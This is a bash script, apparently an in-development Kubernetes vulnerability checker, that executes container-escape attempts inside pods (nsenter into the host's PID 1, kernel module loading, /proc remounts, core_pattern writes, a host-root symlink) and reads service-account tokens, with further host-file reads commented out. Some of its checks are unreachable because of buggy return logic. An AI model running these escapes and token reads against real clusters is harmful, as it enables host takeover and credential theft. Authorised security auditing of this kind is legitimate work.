#!/bin/bash

# So: this script is SIMPLY there to launch controlled attacks that I know work, its not comprehensive
check_permission() {
    local action=$1
    local resource=$2
    local namespace=$3

    if kubectl auth can-i $action $resource -n $namespace; then
        echo "Vulnerable: User can $action $resource in namespace $namespace"
    else
        echo "Secure: User cannot $action $resource in namespace $namespace"
    fi
}

check_command_in_pod() {
    local namespace=$1
    local pod=$2
    local command=$3
    local podname=$(kubectl get pod $pod -n $namespace -o jsonpath='{.spec.containers[0].name}')
    local configmap_name="$pod-$namespace-results"

    
    error_output=$(kubectl exec -n "$namespace"  "$pod" -c "$podname" -- /bin/bash -c "$command" 2>&1 /dev/null)
    #echo "$error_output"
    if kubectl get configmap "$configmap_name" -n storm &> /dev/null; then 
        kubectl patch configmap "$configmap_name" -n storm -p "{\"data\":{\"$command\":\"$error_output\"}}"
    else
        kubectl create configmap "$configmap_name" --from-literal="$attack_name=$command+$error_output" -n storm
    fi
    if [[ "$error_output" == *"SUCCESS1"* ]]; then
        echo "Vulnerable: Command chain: '$command' succeeded in pod $pod in namespace $namespace"
        return 1
    else
        echo "Secure: Command chain: '$command' failed in pod $pod in namespace $namespace"
        return 0
    fi
    if [[ "$error_output" == *"SUCCESS2"* ]]; then
        echo "Vulnerable: Command chain: '$second_command' succeeded in pod $pod in namespace $namespace"
        return 1
    else
        echo "Secure: Command chain: '$second_command' failed in pod $pod in namespace $namespace"
        return 0
    fi
}

debug_command_in_pod() {
    local namespace=$1
    local pod=$2
    local image=$3
    local command=$4
    local second_command=$5
    local serviceaccount=$(kubectl get pod $pod -n $namespace -o jsonpath='{.spec.serviceAccountName}')
    local configmap_name="$pod-$namespace-results-debug"
    echo "Service account: $serviceaccount"

    #kubectl must use the service account of the lightening to launch the debug container
    #but execute the command as the service account of the container

    full_command="$command"
    if [[ -n "$second_command" ]]; then
        full_command="$full_command && echo SUCCESS1 && $second_command && echo SUCCESS2"
    fi

    error_output=$(kubectl debug --profile=general -n "$namespace" -it "$pod" --image="$image" -- /bin/bash -c "$full_command" 2>&1 /dev/null)
    #echo "$error_output"
    if kubectl get configmap "$configmap_name" -n storm &> /dev/null; then 
        kubectl patch configmap "$configmap_name" -n storm -p "{\"data\":{\"$command\":\"$error_output\"}}"
    else
        kubectl create configmap "$configmap_name" --from-literal="$attack_name=$command+$error_output" -n storm
    fi

    if [[ "$error_output" == *"SUCCESS1"* ]]; then
        echo "Vulnerable: Command chain: '$command' succeeded in pod $pod in namespace $namespace"
        return 1
    else
        echo "Secure: Command chain: '$command' failed in pod $pod in namespace $namespace"
        return 0
    fi
    if [[ "$error_output" == *"SUCCESS2"* ]]; then
        echo "Vulnerable: Command chain: '$second_command' succeeded in pod $pod in namespace $namespace"
        return 1
    else
        echo "Secure: Command chain: '$second_command' failed in pod $pod in namespace $namespace"
        return 0
    fi


}

check_capabilities_outside_pod() {
    output_file="all_container_caps.txt"
    temp_dir="/tmp/cap-checker-output"
    mkdir -p $temp_dir
    > $output_file
    nodes=$(kubectl get nodes -o jsonpath='{.items[*].metadata.name}')

    for node in $nodes; do
        echo "Collecting capabilities from node: $node"

        p=$(kubectl get pods -l app=cap-checker -o jsonpath="{.items[?(@.spec.nodeName=='$node')].metadata.name}")
        kubectl exec -n storm "$p" -- /bin/sh -c "for pid in \$(ls /proc | grep -E '^[0-9]+$'); do cap_eff=\$(capsh --decode=\$(cat /proc/\$pid/status | grep CapEff | awk '{print \$2}')); if [ -n \"\$cap_eff\" ]; then binary=\$(readlink -f /proc/\$pid/exe); cmdlines=\$(cat /proc/\$pid/cmdline)  ; echo \"Binary: \$binary, Cmdline: \$cmdlines, PID: \$pid, CapEff: \$cap_eff \"; fi; done" > "$temp_dir/container_caps_$node.txt" 
 
        # Append the content to the final output file
        cat $temp_dir/container_caps_$node.txt >> $output_file
    done
    #cat $output_file | grep -v awk | grep -v kubectl | grep -v containerd-shim-runc-v2 |grep -v containerd| grep -v systemd| grep -v pause | grep -v kubelet  | grep -v kube-apiserver | grep -v kube-controller-manager | grep -v kube-scheduler | grep -v kube-proxy | grep -v etcd | grep -v kindnetd | grep -v coredns | grep -v local-path-provisioner 
    kubectl create configmap container-capabilities --from-file=$output_file -n storm -o yaml --dry-run=client | kubectl apply -f -
if [[ $? -eq 0 ]]; then
  echo "ConfigMap 'container-capabilities' created successfully."
else
  echo "Error creating ConfigMap 'container-capabilities'."
fi
}
# Get all namespaces
namespaces=$(kubectl get namespaces -o jsonpath='{.items[*].metadata.name}')

declare -A attack_dictionary
declare -A unattack_dictionary

attack_dictionary["CE_MODULE_LOAD"]="modprobe $(lsmod | awk 'NR==2{print $1}')"
unattack_dictionary["CE_MODULE_LOAD"]="modprobe -r $(lsmod | awk 'NR==2{print $1}')" #that could be unsafe, so do NOT use in PROD
attack_dictionary["CE_NSENTER"]="nsenter -t 1 -a /bin/bash  -c 'lsns ; mkdir -p /tmps; mount -t tmpfs tmpfs /tmps;  exit'"
unattack_dictionary["CE_NSENTER"]="umount /tmps; rmdir /tmps"
attack_dictionary["CE_PRIV_MOUNT"]="mount -t proc proc /proc"
# do not unmount proc, it will crash a lot of stuff depending how exactly that succeeded -> DO NOT USE ON REAL CLUSTER
attack_dictionary["CE_SYS_PTRACE"]="strace -ff true"
# does not have side effects
attack_dictionary["CE_UMH_CORE_PATTERN"]="cat /proc/self/mounts && echo $(cat /proc/sys/kernel/core_pattern) > /proc/sys/kernel/core_pattern"
attack_dictionary["CE_VAR_LOG_SYMLINK"]="ln -s / /host/var/log/root_link "
unattack_dictionary["CE_VAR_LOG_SYMLINK"]="rm /host/var/log/root_link "
# attack_dictionary["CONTAINER_ATTACH"]="kubectl attach $pod -n $ns -it && echo SUCCESS"  
# attack_dictionary["IDENTITY_IMPERSONATE"]='kubectl auth can-i impersonate users -n $ns && echo SUCCESS'
# attack_dictionary["POD_CREATE"]='kubectl auth can-i create pods -n $ns && echo SUCCESS'
# attack_dictionary["POD_EXEC"]='kubectl auth can-i exec pods -n "$ns" && echo SUCCESS' 
# attack_dictionary["EXPLOIT_CONTAINERD_SOCK"]="ls /run/containerd/containerd.sock && echo SUCCESS"
# attack_dictionary["EXPLOIT_HOST_READ"]="cat /host/etc/passwd && echo SUCCESS"
# attack_dictionary["EXPLOIT_HOST_TRAVERSE"]="ls /host && echo SUCCESS"
# attack_dictionary["EXPLOIT_HOST_WRITE"]="echo 'test' > /host/tmp/testfile && echo SUCCESS"
# attack_dictionary["IDENTITY_ASSUME"]='kubectl auth can-i impersonate serviceaccounts -n $ns && echo SUCCESS'
# attack_dictionary["PERMISSION_DISCOVER"]='kubectl auth can-i get roles,rolebindings,clusterroles,clusterrolebindings -n $ns && echo SUCCESS' 
# attack_dictionary["POD_ATTACH"]='kubectl auth can-i attach pods -n $ns && echo SUCCESS'
# attack_dictionary["POD_PATCH"]='kubectl auth can-i patch pods -n $ns && echo SUCCESS'
# attack_dictionary["ROLE_BIND"]='kubectl auth can-i create rolebindings,clusterrolebindings -n $ns && echo SUCCESS' 
# attack_dictionary["SHARE_PS_NAMESPACE"]="ps aux && echo SUCCESS"
# attack_dictionary["TOKEN_BRUTEFORCE"]="curl -X POST -d 'token=...' http://kubernetes.default.svc && echo SUCCESS" 
# attack_dictionary["TOKEN_LIST"]='kubectl auth can-i list secrets -n $ns && echo SUCCESS'
# attack_dictionary["TOKEN_STEAL"]="cat /var/run/secrets/kubernetes.io/serviceaccount/token && echo SUCCESS"
# attack_dictionary["VOLUME_ACCESS"]='kubectl auth can-i get persistentvolumeclaims -n $ns && echo SUCCESS'
# attack_dictionary["VOLUME_DISCOVER"]='kubectl auth can-i list persistentvolumes -n $ns && echo SUCCESS'


# Iterate over all namespaces # WHILE IN DEVELOPMENT, I WILL ONLY CHECK THE DEFAULT NAMESPACE
#for ns in $namespaces; do
for ns in default; do
    echo "Processing namespace: $ns"

    # Get all pods in the namespace
    pods=$(kubectl get pods -n $ns -o jsonpath='{.items[*].metadata.name}')

    # Check for various vulnerabilities
    for pod in $pods; do
        echo "Processing pod: $pod"
        manifest=$(kubectl get pod $pod -n $ns -o json)

        # Collect all caps from all containers in all nodes into a file TODO: pretty print and put into a DB
        check_capabilities_outside_pod
        # CE_MODULE_LOAD: Check if its possible to load kernel modules 
        # Then: try to actually load the modules found in lsmod or under /lib/modules

        attack_name="CE_MODULE_LOAD"  
        echo "Checking for $attack_name DEBUG"
        command="${attack_dictionary[$attack_name]}"
        if [[ -n "$command" ]]; then  
            debug_command_in_pod "$ns" "$pod" "entlein/lightening:0.0.2" "$command" 
        fi

        if echo $manifest | jq '.spec.containers[].securityContext | select(.privileged == true or (.capabilities.add[] == "SYS_MODULE"))' > /dev/null; then
            if [ $? -eq 0 ]; then
                echo $manifest | jq '.spec.containers[].securityContext'
                if echo $manifest | jq '.spec.containers[].securityContext.privileged == true' > /dev/null; then
                    echo "Pod manifest of $pod in namespace $ns is priviledged"
                else
                echo "Pod manifest of $pod in namespace $ns has cap_sys_module capability"
                fi
            else
                echo "Pod manifest of $pod in namespace $ns does not have cap_sys_module capability"
            fi
        fi


        # CE_NSENTER: Check if the user can use nsenter to escape the contianer
        attack_name="CE_NSENTER"  
        echo "Checking for $attack_name"
        command="${attack_dictionary[$attack_name]}"
        second_command="${attack_dictionary[CE_PRIV_MOUNT]}"  #THIS IS JUST A SKETCH TODO: implement in proper language
        if [[ -n "$command" ]]; then  
            #debug_command_in_pod "$ns" "$pod" "entlein/lightening:0.0.2" "$command" "$second_command" #TODO: make it spawn inside the same shell!!! THAT MAKES MORE SENSE
            check_command_in_pod $ns $pod "$command && echo SUCCESS1" # && $second_command  && echo SUCCESS2 "
        fi

        # CE_PRIV_MOUNT: Check if the user can mount filesystems
        # TODO: find out why the debug container in this case can do the nsenter but the above nsenter-debugger cannot
        attack_name="CE_PRIV_MOUNT"  
        echo "Checking for $attack_name DEBUG"
        command="${attack_dictionary[$attack_name]}"
        second_command="${attack_dictionary[CE_NSENTER]}" 
        if [[ -n "$command" ]]; then  
            debug_command_in_pod "$ns" "$pod" "entlein/lightening:0.0.2" "$command" "$second_command" 
        fi
        attack_name="CE_PRIV_MOUNT"  
        echo "Checking for $attack_name "
        command="${attack_dictionary[$attack_name]}"
        second_command="${attack_dictionary[CE_NSENTER]}" 
        if [[ -n "$command" ]]; then  
            check_command_in_pod $ns $pod "$command && echo SUCCESS1 && $second_command  && echo SUCCESS2 "
        fi


        # CE_SYS_PTRACE: Check if the user can use ptrace
        attack_name="CE_SYS_PTRACE"  
        echo "Checking for $attack_name DEBUG"
        command="${attack_dictionary[$attack_name]}"
        if [[ -n "$command" ]]; then  
            debug_command_in_pod "$ns" "$pod" "entlein/lightening:0.0.2" "$command" 
            check_command_in_pod $ns $pod "$command && echo SUCCESS1"
        fi

        attack_name="CE_UMH_CORE_PATTERN"
        echo "Checking for $attack_name"
        command="${attack_dictionary[$attack_name]}"
        if [[ -n "$command" ]]; then  
            debug_command_in_pod "$ns" "$pod" "entlein/lightening:0.0.2" "$command" 
            check_command_in_pod $ns $pod "$command && echo SUCCESS1"
        fi

        attack_name="CE_VAR_LOG_SYMLINK"
        echo "Checking for $attack_name"
        command="${attack_dictionary[$attack_name]}"
        if [[ -n "$command" ]]; then  
            debug_command_in_pod "$ns" "$pod" "entlein/lightening:0.0.2" "$command" 
            check_command_in_pod $ns $pod "$command && echo SUCCESS1"
        fi

        # CONTAINER_ATTACH: 

        # IDENTITY_IMPERSONATE: Check if the user can impersonate other users
        check_permission "impersonate" "users" $ns

        # POD_CREATE: Check if the user can create pods
        check_permission "create" "pods" $ns

        # POD_EXEC: Check if the user can exec into pods
        check_permission "exec" "pods" $ns

        # EXPLOIT_CONTAINERD_SOCK: Check if the user can access containerd socket
        check_command_in_pod $ns $pod "ls /run/containerd/containerd.sock"

        # EXPLOIT_HOST_READ: Check if the user can read host files
        #check_command_in_pod $ns $pod "cat /host/etc/passwd"

        # EXPLOIT_HOST_TRAVERSE: Check if the user can traverse host directories
        #check_command_in_pod $ns $pod "ls /host"

        # EXPLOIT_HOST_WRITE: Check if the user can write to host files
        #check_command_in_pod $ns $pod "echo 'test' > /host/tmp/testfile"

        # IDENTITY_ASSUME: Check if the user can assume other identities
        check_permission "impersonate" "serviceaccounts" $ns

        # PERMISSION_DISCOVER: Check if the user can discover permissions
        check_permission "get" "roles" $ns
        check_permission "get" "rolebindings" $ns
        check_permission "get" "clusterroles" $ns
        check_permission "get" "clusterrolebindings" $ns

        # POD_ATTACH: Check if the user can attach to pods

        # POD_PATCH: Check if the user can patch pods
        check_permission "patch" "pods" $ns

        # ROLE_BIND: Check if the user can bind roles
        check_permission "create" "rolebindings" $ns
        check_permission "create" "clusterrolebindings" $ns

        # SHARE_PS_NAMESPACE: Check if the user can share process namespace
        #check_command_in_pod $ns $pod "ps aux"

        # TOKEN_BRUTEFORCE: Check if the user can brute force tokens
        #check_command_in_pod $ns $pod "curl -X POST -d 'token=...' http://kubernetes.default.svc"

        # TOKEN_LIST: Check if the user can list tokens
        check_permission "list" "secrets" $ns

        # TOKEN_STEAL: Check if the user can steal tokens
        check_command_in_pod $ns $pod "cat /var/run/secrets/kubernetes.io/serviceaccount/token"

        # VOLUME_ACCESS: Check if the user can access volumes
        check_permission "get" "persistentvolumeclaims" $ns

        # VOLUME_DISCOVER: Check if the user can discover volumes
        check_permission "list" "persistentvolumes" $ns
    done
done

echo "Vulnerability checks completed."


#docker run --rm --network host aquasec/kube-hunter --cidr 172.18.0.2